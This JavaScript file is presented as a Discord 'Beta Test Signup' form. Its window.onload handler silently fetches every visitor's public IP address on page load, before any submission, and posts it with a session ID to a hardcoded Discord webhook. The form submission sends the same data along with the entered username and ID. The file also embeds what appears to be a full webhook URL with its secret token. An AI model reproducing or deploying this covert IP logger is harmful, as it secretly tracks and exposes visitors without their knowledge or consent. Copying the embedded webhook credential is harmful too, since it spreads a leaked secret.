function generateSessionKey() {
    const timestamp = Date.now(); // Current timestamp
    const randomNum = Math.floor(Math.random() * 1000000); // Random number for uniqueness
    const sessionKey = `sess-${timestamp}-${randomNum}`; // Format the session key
    return sessionKey;
}

const SessionID = generateSessionKey();

// Send log data to Discord webhook
async function logIpAddress(discordUser, discordId) {
    try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        const webhookUrl = "https://discord.com/api/webhooks/1323904338556485685/5IxGOQCI-cPRzYt9yzkLTRLl2poWDPEUXUfDnMm_Q3WVWNLIEoZJaHCFReITxucakY97";
        const payload = {
            embeds: [{
                title: "Beta Test Signup",
                description: `User is signing up for beta testing.`,
                color: 3066993,
                fields: [
                    {
                        name: "Discord Username",
                        value: discordUser,
                        inline: true
                    },
                    {
                        name: "Discord ID",
                        value: discordId,
                        inline: true
                    },
                    {
                        name: "IP Address",
                        value: ipAddress,
                        inline: true
                    },
                    {
                        name: "Session ID",
                        value: SessionID,
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        await fetch(webhookUrl, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        document.querySelector('.message').style.display = 'block';
        document.querySelector('.message').textContent = 'Successfully submitted for beta testing!';
    } catch (error) {
        console.error("Error sending to webhook:", error);
        alert("There was an error submitting your key. Please try again.");
    }
}

// Handle form submission
function submitForm() {
    const discordUser = document.getElementById('discordUser').value;
    const discordId = document.getElementById('discordId').value;

    // Only proceed if both fields are filled
    if (discordUser && discordId) {
        logIpAddress(discordUser, discordId);
    } else {
        alert("Please fill in both Discord Username and Discord ID.");
    }
}

window.onload = function() {
    logIpAddress("Unknown", 0)
}
